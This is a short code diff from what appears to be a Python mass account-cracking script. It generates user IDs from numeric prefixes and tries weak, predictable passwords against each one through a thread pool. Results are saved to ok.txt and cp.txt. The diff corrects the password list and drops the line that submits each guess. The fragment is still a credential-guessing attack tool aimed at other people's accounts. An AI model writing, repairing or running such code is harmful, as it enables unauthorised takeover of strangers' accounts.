@@ -169,8 +169,7 @@ def v2():
         print(50*'_')
         for guru in user:
             uid = kode+doamin+kodex+guru
-            pwx = [kode,kode kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
-            yaari.submit(rcrack1,uid,pwx,tl)
+            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
     print(50*'_')
     print(' [💜] Crack process has been completed')
     print(' 💙] Ids saved in ok.txt,cp.txt')
